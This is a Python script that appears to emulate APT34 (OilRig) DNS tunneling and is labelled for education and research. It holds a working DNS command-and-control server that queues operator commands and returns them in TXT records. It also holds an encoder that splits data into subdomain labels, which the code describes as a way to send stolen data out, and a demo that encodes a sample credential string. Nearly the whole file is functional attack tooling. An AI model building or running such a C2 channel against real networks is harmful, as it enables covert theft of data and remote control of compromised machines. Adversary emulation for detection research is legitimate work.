# Helix Kitten (APT34/OilRig) - DNS Tunneling C2
# Implements DNS-based command and control via TXT/A record queries
# MITRE ATT&CK: T1071.004 (DNS), T1572 (Protocol Tunneling)

# For educational and research purposes only
# Author: Nour A
# Reference: https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused/

import socket
import struct
import base64
import hashlib
import os
import sys
import json
import time
import threading
from datetime import datetime


# DNS protocol constants
DNS_QUERY = 0x0100
DNS_RESPONSE = 0x8180
TYPE_A = 1
TYPE_TXT = 16
TYPE_CNAME = 5
TYPE_MX = 15
CLASS_IN = 1

# APT34 DNS tunneling configuration
DOMAIN_SUFFIX = "update.example.com"
MAX_LABEL_LENGTH = 63
MAX_DNS_NAME = 253
ENCODING_ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz"


def build_dns_query(name, qtype=TYPE_A):
    """Build a raw DNS query packet (RFC 1035)."""
    # transaction ID
    txid = struct.pack("!H", os.urandom(2)[0] << 8 | os.urandom(2)[1])

    # flags: standard query, recursion desired
    flags = struct.pack("!H", DNS_QUERY)

    # counts: 1 question, 0 answers/auth/additional
    counts = struct.pack("!HHHH", 1, 0, 0, 0)

    # question section: encode domain name
    qname = b""
    for label in name.split("."):
        qname += struct.pack("!B", len(label))
        qname += label.encode()
    qname += b"\x00"  # root label

    # question type and class
    qtype_class = struct.pack("!HH", qtype, CLASS_IN)

    return txid + flags + counts + qname + qtype_class


def parse_dns_response(data):
    """Parse a DNS response packet."""
    if len(data) < 12:
        return None

    txid = struct.unpack("!H", data[0:2])[0]
    flags = struct.unpack("!H", data[2:4])[0]
    qdcount = struct.unpack("!H", data[4:6])[0]
    ancount = struct.unpack("!H", data[6:8])[0]

    # skip question section
    offset = 12
    for _ in range(qdcount):
        while offset < len(data) and data[offset] != 0:
            label_len = data[offset]
            if label_len & 0xC0:  # pointer
                offset += 2
                break
            offset += 1 + label_len
        else:
            offset += 1  # null terminator
        offset += 4  # qtype + qclass

    # parse answer section
    answers = []
    for _ in range(ancount):
        # name (may be compressed)
        if offset >= len(data):
            break
        if data[offset] & 0xC0:
            offset += 2
        else:
            while offset < len(data) and data[offset] != 0:
                offset += 1 + data[offset]
            offset += 1

        if offset + 10 > len(data):
            break

        rtype = struct.unpack("!H", data[offset:offset + 2])[0]
        rclass = struct.unpack("!H", data[offset + 2:offset + 4])[0]
        ttl = struct.unpack("!I", data[offset + 4:offset + 8])[0]
        rdlength = struct.unpack("!H", data[offset + 8:offset + 10])[0]
        offset += 10

        rdata = data[offset:offset + rdlength]
        offset += rdlength

        if rtype == TYPE_A and rdlength == 4:
            answers.append({
                "type": "A",
                "data": socket.inet_ntoa(rdata)
            })
        elif rtype == TYPE_TXT:
            # TXT records have a length prefix byte
            txt_len = rdata[0]
            answers.append({
                "type": "TXT",
                "data": rdata[1:1 + txt_len].decode(errors="ignore")
            })

    return {"txid": txid, "flags": flags, "answers": answers}


def encode_data_dns(data, suffix=DOMAIN_SUFFIX):
    """Encode binary data into DNS-safe labels for exfiltration.
    Data is hex-encoded and split into 63-char labels.
    APT34 uses this to send stolen data via DNS queries.
    """
    encoded = data.hex()
    labels = []
    for i in range(0, len(encoded), MAX_LABEL_LENGTH):
        labels.append(encoded[i:i + MAX_LABEL_LENGTH])

    # each label becomes a subdomain: <data>.<seq>.<suffix>
    queries = []
    for seq, label in enumerate(labels):
        name = f"{label}.{seq}.{suffix}"
        if len(name) <= MAX_DNS_NAME:
            queries.append(name)

    return queries


def decode_dns_data(labels):
    """Decode data from DNS label encoding."""
    # strip sequence numbers and suffix, concatenate hex data
    hex_data = ""
    for label in sorted(labels, key=lambda x: x[1]):
        hex_data += label[0]

    try:
        return bytes.fromhex(hex_data)
    except ValueError:
        return None


class DNSTunnelServer:
    """DNS tunnel C2 server.
    Listens for DNS queries from implants and responds with encoded commands.
    APT34's BONDUPDATER and GLIMPSE tools use DNS tunneling for C2.
    """

    def __init__(self, listen_host="0.0.0.0", listen_port=53):
        self.host = listen_host
        self.port = listen_port
        self.running = False
        self.sessions = {}
        self.command_queue = {}
        self.exfil_buffer = {}

    def build_response(self, query_data, response_data):
        """Build a DNS response packet with embedded C2 data."""
        # copy txid and set response flags
        txid = query_data[:2]
        flags = struct.pack("!H", DNS_RESPONSE)

        # 1 question, 1 answer
        counts = struct.pack("!HHHH", 1, 1, 0, 0)

        # copy question section from query
        offset = 12
        while offset < len(query_data) and query_data[offset] != 0:
            offset += 1 + query_data[offset]
        offset += 5  # null + qtype + qclass
        question = query_data[12:offset]

        # answer section
        # name pointer to question
        answer = struct.pack("!H", 0xC00C)

        if isinstance(response_data, str):
            # TXT record response (for commands)
            encoded = response_data.encode()
            txt_data = struct.pack("!B", len(encoded)) + encoded
            answer += struct.pack("!HHI", TYPE_TXT, CLASS_IN, 60)  # TTL=60
            answer += struct.pack("!H", len(txt_data))
            answer += txt_data
        else:
            # A record response (for acknowledgments)
            answer += struct.pack("!HHI", TYPE_A, CLASS_IN, 60)
            answer += struct.pack("!H", 4)
            answer += socket.inet_aton(response_data)

        return txid + flags + counts + question + answer

    def handle_query(self, data, addr, sock):
        """Process an incoming DNS query and extract/inject C2 data."""
        if len(data) < 12:
            return

        # parse query name
        offset = 12
        labels = []
        while offset < len(data) and data[offset] != 0:
            label_len = data[offset]
            offset += 1
            label = data[offset:offset + label_len].decode(errors="ignore")
            labels.append(label)
            offset += label_len

        query_name = ".".join(labels)
        qtype = struct.unpack("!H", data[offset + 1:offset + 3])[0]
        timestamp = datetime.now().strftime("%H:%M:%S")

        # check if this is a tunnel query (ends with our suffix)
        if query_name.endswith(DOMAIN_SUFFIX):
            # extract the data labels (everything before suffix)
            suffix_parts = DOMAIN_SUFFIX.split(".")
            data_labels = labels[:-len(suffix_parts)]

            if len(data_labels) >= 2:
                session_id = data_labels[-1]  # sequence/session identifier
                payload = ".".join(data_labels[:-1])

                print(f"  [{timestamp}] TUNNEL [{addr[0]}] "
                      f"Session: {session_id} | Data: {payload[:40]}...")

                # track session
                if session_id not in self.sessions:
                    self.sessions[session_id] = {
                        "ip": addr[0],
                        "first_seen": timestamp,
                        "queries": 0
                    }
                self.sessions[session_id]["queries"] += 1
                self.sessions[session_id]["last_seen"] = timestamp

                # buffer exfiltrated data
                if session_id not in self.exfil_buffer:
                    self.exfil_buffer[session_id] = []
                self.exfil_buffer[session_id].append(payload)

                # check for pending commands
                cmd_response = "NOP"
                if session_id in self.command_queue and \
                   self.command_queue[session_id]:
                    cmd = self.command_queue[session_id].pop(0)
                    cmd_response = base64.b64encode(
                        json.dumps(cmd).encode()
                    ).decode()

                # send response with command (via TXT record)
                if qtype == TYPE_TXT:
                    response = self.build_response(data, cmd_response)
                else:
                    response = self.build_response(data, "10.0.0.1")

                sock.sendto(response, addr)
            else:
                # acknowledge beacon
                response = self.build_response(data, "10.0.0.1")
                sock.sendto(response, addr)
        else:
            # not a tunnel query, respond with NXDOMAIN or forward
            print(f"  [{timestamp}] NORMAL [{addr[0]}] {query_name}")
            response = self.build_response(data, "0.0.0.0")
            sock.sendto(response, addr)

    def start(self):
        """Start the DNS tunnel server."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.settimeout(1)
        self.running = True

        print(f"[+] DNS Tunnel C2 listening on {self.host}:{self.port}")
        print(f"[+] Tunnel domain: *.{DOMAIN_SUFFIX}")
        print(f"[+] Query types: A, TXT (for bidirectional data)")
        print()

        try:
            while self.running:
                try:
                    data, addr = sock.recvfrom(4096)
                    self.handle_query(data, addr, sock)
                except socket.timeout:
                    continue
        except KeyboardInterrupt:
            print("\n[*] Shutting down DNS tunnel...")
        finally:
            self.running = False
            sock.close()
            self._print_summary()

    def _print_summary(self):
        print()
        print("=" * 50)
        print("DNS TUNNEL SESSION SUMMARY")
        print("=" * 50)
        for sid, info in self.sessions.items():
            print(f"  Session: {sid}")
            print(f"    IP: {info['ip']}")
            print(f"    Queries: {info['queries']}")
            print(f"    First: {info['first_seen']} | Last: {info['last_seen']}")
            if sid in self.exfil_buffer:
                total = sum(len(d) for d in self.exfil_buffer[sid])
                print(f"    Exfil data: {total} chars in "
                      f"{len(self.exfil_buffer[sid])} chunks")
        print("=" * 50)


def demo_encoding():
    """Demonstrate the DNS encoding/decoding."""
    print("[DEMO] DNS Data Encoding")
    print("-" * 50)

    test_data = b"credential_data:admin:P@ssw0rd123"
    print(f"  Original: {test_data.decode()}")
    print(f"  Size: {len(test_data)} bytes")

    queries = encode_data_dns(test_data)
    for i, q in enumerate(queries):
        print(f"  DNS Query {i}: {q}")

    # build actual DNS packet
    for q in queries[:2]:
        packet = build_dns_query(q, TYPE_TXT)
        print(f"  Packet size: {len(packet)} bytes")
    print()


def main():
    print("=" * 70)
    print("HELIX KITTEN (APT34) - DNS TUNNELING C2")
    print("DNS-Based Command and Control Server")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print("[!] Reference: Unit 42 - BONDUPDATER DNS Tunneling")
    print()

    # show encoding demo
    demo_encoding()

    # start server
    host = "127.0.0.1"
    port = 5353  # non-privileged port for demo
    if len(sys.argv) > 1:
        port = int(sys.argv[1])

    print(f"[*] Starting DNS tunnel on {host}:{port}")
    print(f"[*] Press Ctrl+C to stop")
    print()

    server = DNSTunnelServer(listen_host=host, listen_port=port)
    server.start()


if __name__ == "__main__":
    main()
